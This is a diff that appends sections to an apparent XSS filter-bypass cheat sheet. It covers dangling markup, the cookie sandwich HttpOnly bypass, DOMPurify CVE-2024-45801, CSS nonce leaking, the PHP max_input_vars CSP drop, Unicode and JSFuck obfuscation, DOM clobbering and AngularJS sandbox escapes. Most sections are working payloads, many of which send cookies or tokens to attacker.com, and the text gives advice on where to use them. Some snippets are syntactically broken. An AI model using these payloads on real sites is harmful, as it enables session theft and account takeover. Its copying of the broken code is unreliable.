@@ -1344,3 +1344,453 @@ ws.onopen = function() {
 | API key / OAuth app name | Admin billing/key management view | Platform admin |
 | Feedback / bug report form | Viewed by engineering or support | Internal employee |
 | Webhook description | Admin webhook management panel | Admin session |
+
+---
+
+## Dangling Markup Injection
+
+**Type:** reflected
+**Filter bypassed:** Strict CSP (no `unsafe-inline`, no `script-src`); XSS filters that block script execution but allow partial HTML injection
+**Bypass logic:** When XSS is blocked but HTML injection is possible, an unclosed `<img src="` or `<form action="` causes the browser to capture everything following the injection point — including CSRF tokens, nonces, email addresses, and other sensitive page content — and exfiltrate it as part of an HTTP request URL to the attacker's server. No JavaScript required.
+**Attack chain:** HTML injection → unclosed attribute slurps subsequent page content → CSRF token/nonce captured via HTTP request to attacker → CSRF attack executed → account actions performed without victim's knowledge
+
+**Payload:**
+```html
+<!-- Unclosed src attribute — browser sends subsequent page text as URL path -->
+<img src='https://attacker.com/?leak=
+
+<!-- Form redirect — captures all form inputs on the page -->
+<form action='https://attacker.com/steal'>
+
+<!-- Meta refresh — page redirects with captured content in URL -->
+<meta http-equiv=refresh content='0;url=https://attacker.com/?c=
+
+<!-- Named anchor — captures text up to the next matching quote char in source -->
+<a href='https://attacker.com/?x=
+```
+
+**Where to use:** Any endpoint where HTML injection is possible but CSP blocks script execution — login pages with error message reflection, account settings with display name reflection, partial HTML injection in API responses.
+
+**Source:** https://portswigger.net/web-security/cross-site-scripting/dangling-markup
+
+---
+
+## Cookie Sandwich Technique — HttpOnly Bypass
+
+**Type:** stored / reflected (post-XSS exploitation)
+**Filter bypassed:** `HttpOnly` cookie flag — normally prevents `document.cookie` from reading session cookies
+**Bypass logic:** Many servers support RFC2109 (legacy) cookie parsing alongside RFC6265. When the `$Version` cookie appears first in the `Cookie` header, servers switch to legacy mode where quoted strings are valid cookie values. By setting two attacker-controlled cookies that "sandwich" the HttpOnly target cookie — one whose value ends with `"` and one whose value starts with `"` — the legacy parser reads all cookies between the quotes as a single value and reflects the full string (including the HttpOnly cookie) in a response body accessible via `fetch()` with credentials.
+**Attack chain:** XSS fires → attacker sets `$Version` + sandwich cookies → `fetch()` endpoint that echoes `Cookie` header or parses cookie values → response body contains HttpOnly cookie value → exfil to attacker server → full session hijack
+
+**Payload:**
+```javascript
+// From XSS context on target.com:
+
+// Step 1: Set $Version cookie with longer path so it sorts first in Cookie header
+document.cookie = '$Version=1; path=/json/';
+
+// Step 2: Set opening sandwich cookie (value ends with " to open RFC2109 quote)
+document.cookie = 'wrap_start="; path=/';
+
+// Step 3: Set closing sandwich cookie (value is just a closing quote)
+document.cookie = 'wrap_end="; path=/';
+
+// Cookie header now looks like:
+// Cookie: $Version=1; wrap_start="; PHPSESSID=SECRET_VALUE; wrap_end="
+// Legacy parser reads wrap_start's value as: " PHPSESSID=SECRET_VALUE "
+// → PHPSESSID is now part of wrap_start's quoted value and reflected in response
+
+// Step 4: Fetch endpoint that echoes cookies
+fetch('/api/session/info', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => {
+    fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));
+  });
+
+// Affected stacks: Apache Tomcat 8.5.x / 9.0.x / 10.0.x (RFC2109 on by default)
+//                  Python Flask (legacy parsing supported)
+// Prerequisite: XSS on target domain + endpoint that reflects Cookie header in response
+```
+
+**Source:** https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique
+
+---
+
+## DOMPurify Prototype Pollution Depth Bypass (CVE-2024-45801)
+
+**Type:** stored / reflected / DOM
+**Filter bypassed:** DOMPurify sanitizer (versions before 2.5.4 and before 3.1.3)
+**Bypass logic:** Two exploitation paths: (1) Pollute `Object.prototype` with a key matching DOMPurify's internal depth counter property name. The `depth > threshold` comparison reads an attacker-controlled `NaN` value — `NaN > 200` is always `false` — so the nesting depth limit is never triggered, allowing arbitrarily deep nested XSS payloads through sanitization. (2) Deeply nested HTML structures alone can confuse the depth counter in some sub-versions. Both paths allow XSS payloads to survive `DOMPurify.sanitize()` and execute when the output is inserted via `innerHTML`.
+**Attack chain:** Prior prototype pollution vector (e.g., `?__proto__[depthKey]=NaN` via lodash/merge) → DOMPurify depth check disabled → XSS payload passes sanitization → inserted via `innerHTML` → arbitrary JS executes → ATO
+
+**Payload:**
+```javascript
+// Step 1: Pollute the depth counter via any existing PP gadget on the page
+// (key name varies; check DOMPurify source for the version in use)
+Object.prototype['__recursionLimit'] = NaN;
+
+// Step 2: Pass a deeply nested XSS payload to DOMPurify
+// (depth check now always returns false due to NaN comparison)
+var malicious = '<svg>'.repeat(300) + '<img src=x onerror=alert(1)>' + '</svg>'.repeat(300);
+var "clean" = DOMPurify.sanitize(malicious);   // passes — depth check bypassed
+document.body.innerHTML = clean;              // XSS fires
+
+// Alternatively — URL-based PP vector (no prior gadget needed if app parses URL params):
+// https://target.com/?__proto__[depthCounter]=NaN&q=<NESTED_XSS>
+
+// Detect DOMPurify version: DOMPurify.version (from browser console or page source)
+// Patched in: DOMPurify >=2.5.4 or >=3.1.3
+// Also check CVE-2026-41238: CUSTOM_ELEMENT_HANDLING fallback polluted by PP
+//   → tagNameCheck / attributeNameCheck regex replaced → arbitrary tags allowed
+```
+
+**Source:** https://github.com/advisories/GHSA-mmhx-hmjr-r674 ; https://www.sentinelone.com/vulnerability-database/cve-2024-45801/
+
+---
+
+## CSS Attribute Selector Nonce Leak + bfcache CSP Bypass
+
+**Type:** reflected (HTML/CSS injection only — no script execution required to leak)
+**Filter bypassed:** Strict nonce-based CSP (`script-src 'nonce-XYZ'`) — widely considered near-unbypassable without the nonce
+**Bypass logic:** CSS attribute selectors (`script[nonce^="a"]`) can fire `background-image` network requests conditionally based on whether an attribute value begins with a specific character. By injecting CSS that iterates over each possible nonce character, an attacker leaks the full nonce one character at a time via server-side request logging. Once the nonce is known, the browser's bfcache or disk cache may still hold the original page with the matching nonce — navigating back serves the stale page with the known nonce, into which the attacker injects `<script nonce="LEAKED">`.
+**Attack chain:** CSS injection → attribute selector oracle leaks nonce char-by-char → full nonce reconstructed → inject `<script nonce=LEAKED-NONCE>` → XSS → ATO
+
+**Payload:**
+```html
+<!-- Step 1: Inject CSS oracle for each hex character (0-9, a-f) -->
+<style>
+script[nonce^="0"]{background:url(https://attacker.com/n?c=0)}
+script[nonce^="1"]{background:url(https://attacker.com/n?c=1)}
+script[nonce^="2"]{background:url(https://attacker.com/n?c=2)}
+/* ... repeat for all nonce charset characters ... */
+script[nonce^="a"]{background:url(https://attacker.com/n?c=a)}
+script[nonce^="b"]{background:url(https://attacker.com/n?c=b)}
+/* ... */
+</style>
+<!-- Attacker server logs which request fires → learns first nonce character -->
+<!-- Repeat with nonce^="KNOWN_PREFIX" + each next char to leak full nonce -->
+
+<!-- Step 2: After learning nonce value, inject script with stolen nonce -->
+<script nonce="FULL-LEAKED-NONCE-HERE">
+fetch('https://attacker.com/steal?c=' + document.cookie);
+</script>
+
+<!-- bfcache variant: if the nonce changes per-request, use history navigation -->
+<!-- or link prefetching to serve the cached page version where nonce matches -->
+
+<!-- Automation: use Burp Collaborator + style injection to iterate all chars -->
+<!-- 32-char hex nonce = 32 rounds × 16 requests = 512 requests total        -->
+```
+
+**Source:** https://www.webasha.com/blog/what-is-the-new-technique-that-bypasses-content-security-policy-using-html-injection-and-browser-caching ; https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
+
+---
+
+## PHP max_input_vars CSP Header Bypass
+
+**Type:** reflected / stored
+**Filter bypassed:** CSP policy delivered via PHP `header()` function
+**Bypass logic:** PHP's `max_input_vars` directive (default: 1000) limits the number of parsed input variables. When a request exceeds this limit, PHP emits an `E_WARNING` — which is output as HTML before any user-defined code runs. This causes "headers already sent" — the subsequent `header('Content-Security-Policy: ...')` call silently fails. Without the CSP header, inline scripts execute without restriction.
+**Attack chain:** Submit 1001+ GET/POST parameters → PHP warning printed before CSP header → CSP header never sent → inline XSS payload executes freely
+
+**Payload:**
+```python
+# Python PoC — send 1001 parameters to drop CSP header
+import requests
+
+params = {f'x{i}': 'a' for i in range(1001)}
+params['q'] = '<script>alert(document.cookie)</script>'  # XSS injection param
+
+r = requests.get('https://target.com/search.php', params=params)
+print('Content-Security-Policy' in r.headers)  # False → CSP not sent → XSS works
+print(r.text)  # Should contain the XSS payload unescaped
+```
+
+```html
+<!-- Browser form variant: 1001 hidden inputs -->
+<form method="POST" action="https://target.com/page.php" id="bypass">
+  <input name="inject" value='<img src=x onerror=alert(document.cookie)>'>
+  <!-- generate 1000 more inputs: -->
+  <script>
+    var f = document.getElementById('bypass');
+    for(var i=0;i<1000;i++){
+      var inp = document.createElement('input');
+      inp.name='p'+i; inp.value='x';
+      f.appendChild(inp);
+    }
+    f.submit();
+  </script>
+</form>
+```
+
+**Note:** Also works via multipart file upload — PHP counts each file toward the limit; 20+ files often trigger the warning.
+
+**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/4%20-%20CSP%20Bypass.md
+
+---
+
+## Full-Width Unicode Angle Bracket Bypass
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / input sanitizers blocking ASCII `<` (U+003C) and `>` (U+003E) without Unicode normalization
+**Bypass logic:** Unicode fullwidth characters `＜` (U+FF1C) and `＞` (U+FF1E) are visually identical to `<>`. Certain server-side template engines, older XML parsers, or frameworks that normalize Unicode before rendering will convert fullwidth to ASCII — meaning the fullwidth characters pass the WAF's ASCII `<>` filter but land in the HTML as functional tag delimiters. Also useful: Unicode modifier letter variants as quote substitutes.
+**Attack chain:** WAF sees fullwidth chars → no block → template engine normalizes U+FF1C→`<` → HTML parser sees valid tag → XSS fires
+
+**Payload:**
+```html
+＜script＞alert(1)＜/script＞
+＜img src=x onerror=alert(document.cookie)＞
+＜svg onload=alert(1)＞
+＜body onload=alert(1)＞
+
+<!-- Modifier letter double prime (U+02BA) as " substitute -->
+＜img src=x onerror=ʺjavascript:alert(1)ʺ＞
+
+<!-- Mix with UTF-8 overlong encoding (some older parsers) -->
+<!-- %C0%BC = overlong encoding of < in UTF-8 (invalid but accepted by some parsers) -->
+%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
+
+<!-- Full-width digits bypass number filters in payloads -->
+＜img src=x onerror=alert(１)＞   <!-- １ = U+FF11 fullwidth digit one -->
+```
+
+**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## Array Method Function Invocation + Regex Source Reconstruction
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** WAF blocking parentheses `()` AND/OR keyword filters blocking function names like `alert`, `fetch`, `eval` — extends no-parens bypass with zero-keyword technique
+**Bypass logic:** Two chained techniques: (1) JavaScript Array prototype methods (`map`, `forEach`, `findIndex`) accept a function reference and invoke it with each element — `[7].map(alert)` calls `alert(7)` without parentheses or the string `"alert"`. (2) Regex literals have a `.source` property returning the literal's pattern as a plain string — `(/al/.source + /ert/.source)` produces `"alert"` without the string `alert` ever appearing in source. Combining both: `top[/al/.source+/ert/.source]` accesses `window.alert` from a string built entirely from regex, then array methods invoke it.
+**Attack chain:** WAF blocks `()` and `alert` keyword → array method + regex source bypass → function invoked → cookie/token exfil → ATO
+
+**Payload:**
+```javascript
+// Basic: array method invocation without ()
+[7].map(alert)                        // → alert(7)
+[1].forEach(alert)                    // → alert(1)
+[11].findIndex(alert)                 // → alert(11)
+[document.cookie].map(fetch.bind(0,'https://attacker.com/steal?c='))
+
+// Regex source reconstruction — no keyword strings in source at all
+top[/al/.source+/ert/.source](8)     // → window['alert'](8)
+top[/fe/.source+/tch/.source]('https://attacker.com/steal?c='+document.cookie)
+
+// Combined: no parens, no keywords, exfil payload
+[document.cookie].map(top[/fe/.source+/tch/.source].bind(top,'https://attacker.com/?'))
+
+// Access nested properties
+window[/doc/.source+/ument/.source][/cook/.source+/ie/.source]
+// → document.cookie (as string, for use in eval or concat)
+
+// Chained with throw (no parens anywhere):
+onerror=top[/al/.source+/ert/.source];throw document.cookie
+<img src=x onerror="onerror=top[/al/.source+/ert/.source];throw 1">
+```
+
+**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## Null Byte Injection in Attribute Names
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / regex rules matching exact event handler attribute names (`onerror`, `onload`, `onclick`) — null bytes or control characters break string matching without affecting browser parsing in certain parsers
+**Bypass logic:** Some browsers and older parsers strip null bytes (`\x00`), vertical tabs (`\x0b`), and other control characters from attribute names during HTML parsing. A WAF that pattern-matches the raw bytes sees `onerror\x00` (no match), but the parser strips the null byte before attribute lookup — treating it as `onerror`. Additionally, a forward slash between attribute name and `=` acts as whitespace in some parsers, bypassing space-sensitive WAF signatures.
+**Attack chain:** WAF sees garbled attribute name → no block → parser normalizes → event handler fires → XSS
+
+**Payload:**
+```html
+<!-- Null byte after attribute name -->
+<img src=x onerror&#x00;=alert(1)>
+<img src=x onerror%00=alert(1)>
+
+<!-- Vertical tab (0x0B) as separator -->
+<img src=x onerror&#x0B;=alert(1)>
+
+<!-- Form feed (0x0C) as whitespace alternative -->
+<img&#x0C;src=x onerror=alert(1)>
+
+<!-- Slash as attribute name/value separator (some parsers) -->
+<img src=x onerror/=alert(0)>
+<img/src=x/onerror=alert(1)>
+
+<!-- Zero-width space (U+200B) within attribute name -->
+<img src=x on&#x200B;error=alert(1)>
+
+<!-- Null in tag name (some legacy parsers) -->
+<scr\x00ipt>alert(1)</scr\x00ipt>
+
+<!-- Incomplete tag trick (auto-closed by browser) -->
+<img src='1' onerror='alert(0)' <
+```
+
+**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
+
+---
+
+## JSFuck — Extreme Character-Set Obfuscation
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** ALL keyword-based WAF rules, all string-pattern detection — uses only 6 characters: `[` `]` `(` `)` `!` `+`
+**Bypass logic:** JSFuck is a JavaScript encoding scheme exploiting type coercion to represent any JS program using only `[]!()`. `![]` coerces to `false`, `!![]` to `true`, `+[]` to `0`, `+!![]` to `1`. From these, any digit, then any ASCII character, then any string, then any function call can be constructed — all without a single alphabetic character. The result is syntactically valid JavaScript that executes in any browser but contains zero recognizable keywords, identifiers, or strings.
+**Attack chain:** Full XSS payload encoded in JSFuck → bypasses all keyword/pattern WAF rules → executed by browser JS engine → cookie theft/ATO
+
+**Payload:**
+```javascript
+// alert(1) encoded (abbreviated — full output ~6KB, use https://jsfuck.com):
+// [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]
+// [...](...) — generates 'alert' then calls it with 1
+
+// Type coercion building blocks:
+![]           // false
+!![]          // true
++[]           // 0
++!![]         // 1
+[]+[]         // ""
+![]+[]        // "false"
+!![]+[]       // "true"
++[![]]        // NaN
+
+// Build 'alert' character by character:
+// 'a' = (![]+[])[+[]]           → 'false'[0] = 'f' ... (iterate indices)
+// Full construction: use https://jsfuck.com or jjencode for production payloads
+
+// Practical shortcut: use eval via JSFuck + atob for shorter total length
+// Encode eval('fetch("//attacker.com?c="+document.cookie)') in JSFuck
+// Often more WAF-resistant than base64+eval due to zero printable keywords
+
+// Where to use:
+// - WAF testing after confirming XSS exists but payload is blocked
+// - Length-constrained contexts where atob/eval are also filtered
+// - Bypass log-based detections that scan for JS keywords
+```
+
+**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md ; https://jsfuck.com
+
+---
+
+## DOM Clobbering → CSP Bypass via script.src Injection
+
+**Type:** DOM / stored (HTML injection only — no script execution required)
+**Filter bypassed:** `strict-dynamic` CSP — which normally prevents unsigned/unnonce'd scripts from loading; bypassed here via HTML-only injection clobbering a config property read into a `<script src>` attribute
+**Bypass logic:** When an app uses `strict-dynamic` and a trusted (nonce-bearing) script reads a config object property into a dynamically created `<script src>`, DOM clobbering can replace that property with an attacker-controlled URL. Double anchor tags with matching `id` attributes create an `HTMLCollection`; the `name` attribute on the second gives it a property name. When the trusted script reads `window.config.scriptPath`, it receives the attacker's URL. Scripts created by trusted scripts inherit `strict-dynamic` trust — no nonce needed for the attacker's script.
+**Attack chain:** HTML injection → double `<a id=config>` clobbers `window.config` → trusted script reads clobbered `config.path` → creates `<script src="attacker.com/evil.js">` → strict-dynamic passes it → attacker JS executes → XSS → ATO
+
+**Payload:**
+```html
+<!-- Target code pattern to exploit: -->
+<!-- var s = document.createElement('script');                    -->
+<!-- s.src = window.appConfig.codeBasePath + '/bundle.js';       -->
+<!-- document.head.appendChild(s);  // trusted, has nonce        -->
+
+<!-- DOM clobbering injection — HTML-only, no script needed: -->
+<a id=appConfig><a id=appConfig name=codeBasePath href="https://attacker.com/evil.js#">
+
+<!-- How it works:                                                        -->
+<!-- window.appConfig → HTMLCollection (two <a> with same id)            -->
+<!-- window.appConfig.codeBasePath → second <a> element (name= match)   -->
+<!-- .href → "https://attacker.com/evil.js#"                             -->
+<!-- Script loads: https://attacker.com/evil.js#/bundle.js               -->
+<!--   (# turns the suffix into a URL fragment — ignored by attacker)    -->
+
+<!-- Variant: clobber nested property two levels deep -->
+<form id=config><input id=scriptPath name=src value="https://attacker.com/x.js"></form>
+<!-- window.config.scriptPath.src → attacker URL -->
+
+<!-- DOM clobbering via form action -->
+<form name=loginForm><input name=action value="https://attacker.com/phish"></form>
+<!-- document.forms.loginForm.action → attacker URL (clobbers form action) -->
+```
+
+**Source:** https://portswigger.net/research/bypassing-csp-via-dom-clobbering ; https://aseemshrey.in/blog/xss-bypass-csp/
+
+---
+
+## Angular CSTI Version-Specific Sandbox Escapes
+
+**Type:** reflected / stored (client-side template injection)
+**Filter bypassed:** AngularJS expression sandbox (versions 1.0–1.5.x); WAF keyword filters blocking `constructor` string
+**Bypass logic:** AngularJS 1.x has an expression sandbox preventing direct `Function()` constructor access in template expressions (`{{ }}`). Each version has a unique mechanism that can be escaped via prototype chain manipulation, `$evalAsync` timing, or method override. Post-1.6, the sandbox was removed — making direct `{{constructor.constructor('alert(1)')()}}` always work. WAF bypass: the string `constructor` can be split into parts concatenated at runtime (never appearing as a single keyword in source).
+**Attack chain:** User input reflected in Angular template context (`ng-bind-html`, unescaped `{{ }}`) → CSTI → version-matched sandbox escape → arbitrary JS → ATO
+
+**Payload:**
+```javascript
+// Angular 1.6+ (sandbox removed — works directly):
+{{constructor.constructor('alert(1)')()}}
+{{[].pop.constructor('alert(1)')()}}
+{{$eval.constructor('alert(document.cookie)')()}}
+{{0[a='constructor'][a]('alert(1)')()}}
+
+// Angular 1.5.9-1.5.11:
+{{
+  c=''.sub.call;b=''.sub.bind;a=b(c,b,b(c,c,
+  c(c,c,b(c,b,b(c,b,b(c,b,a,'alert(1)'))))))));a=a();b(a)()
+}}
+
+// Angular 1.4.x:
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
+
+// Angular 1.3.x:
+{{{}[{toString:[].join,length:1,0:'__proto__'}][{toString:[].join,length:1,0:'valueOf'}]=alert(1)}}
+
+// Angular 1.2.x:
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+
+// Angular 1.0.1-1.1.5:
+{{constructor.constructor('alert(1)')()}}
+
+// Without any quotes (all versions — for quote-filtered contexts):
+{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
+
+// WAF bypass — split "constructor" keyword (bypass Imperva and similar):
+{{['constr','uctor'].join('').constructor('alert(1)')()}}
+{{[]['fil'+'ter']['con'+'structor']('alert(1)')()}}
+
+// WAF bypass — reconstruct via toString(36) without any literal strings:
+// parseInt('constructor', 36) → used in number-to-string chains
+{{(1)[['con','str','uctor'].join('')]['con','str','uctor'].join('')]('alert(1)')()}}
+```
+
+**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md
+
+---
+
+## Bypass Matrix (Updated 2026-05-27)
+
+### New Entries — Techniques Added 2026-05-27
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| `<>` ASCII angle brackets blocked | Full-width Unicode variants | `＜img src=x onerror=alert(1)＞` |
+| WAF event-handler name matching | Null byte in attribute name | `<img src=x onerror%00=alert(1)>` |
+| Parentheses `()` + keyword blocked | Array method invocation | `[7].map(alert)` |
+| Keyword blocked (no `alert` string) | Regex `.source` reconstruction | `top[/al/.source+/ert/.source](8)` |
+| All keywords + characters filtered | JSFuck obfuscation | `[][(![]+[])[+[]]+...]` (uses only `[]!()`) |
+| CSP `strict-dynamic` + HTML injection | DOM clobbering → script.src | `<a id=config><a id=config name=codeBasePath href="//attacker.com/x.js#">` |
+| Nonce-based CSP (with HTML/CSS injection) | CSS attr selector oracle + bfcache | `script[nonce^="a"]{background:url(//attacker.com/n?c=a)}` → steal nonce char-by-char |
+| PHP-delivered CSP header | `max_input_vars` overflow | 1001+ request params → PHP warning → CSP header never sent |
+| `HttpOnly` cookie flag | Cookie sandwich (RFC2109 legacy parsing) | Set `$Version` + wrap cookies via JS → server reflects HttpOnly cookie in response |
+| DOMPurify sanitizer | Prototype pollution depth bypass (CVE-2024-45801) | Pollute depth counter → `NaN` comparison → DOMPurify passes nested XSS |
+| AngularJS expression sandbox | Version-specific CSTI escape | `{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}` |
+| WAF blocking `constructor` keyword | String-split + join reconstruction | `{{['constr','uctor'].join('').constructor('alert(1)')()}}` |
+| Strict CSP (no `unsafe-inline`) | Dangling markup injection | `<img src='https://attacker.com/?x=` → slurps CSRF token from page |
+
+### New Sinks Documented 2026-05-27
+
+| Sink | Context | Notes |
+|------|---------|-------|
+| `script.src` (from clobbered config) | DOM clobbering + strict-dynamic | Clobbered property → trusted script loads attacker URL with inherited trust |
+| CSS `background-image` via attr selector | CSS oracle | Side-channel for nonce/attribute value exfil without JS |
+| Cookie header reflection (RFC2109) | HttpOnly bypass | Server echoes `Cookie` value in response body → HttpOnly exposed |
+| `Array.prototype.map/forEach/findIndex` | Function invocation | Callback invoked without `()` — bypasses paren-blocking WAF |
+
+### CSP Configurations — New Weaknesses (2026-05-27)
+
+| CSP Configuration | Weakness | Bypass |
+|------------------|----------|--------|
+| `script-src 'strict-dynamic' 'nonce-XYZ'` | HTML injection clobbers config → trusted script loads attacker URL | DOM clobbering → `script.src` carries attacker URL, trust inherited |
+| Nonce-based CSP on PHP pages | `max_input_vars` drops CSP header entirely | 1001+ params → PHP E_WARNING → `header()` fails silently |
+| Nonce-based CSP + CSS/HTML injection | CSS attribute selector oracle leaks nonce characters | Inject `<style>script[nonce^="X"]{...}` × all chars → reconstruct nonce |
+| `script-src 'self'` without `object-src` | `<object data=data:text/html;base64,...>` executes scripts | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` |
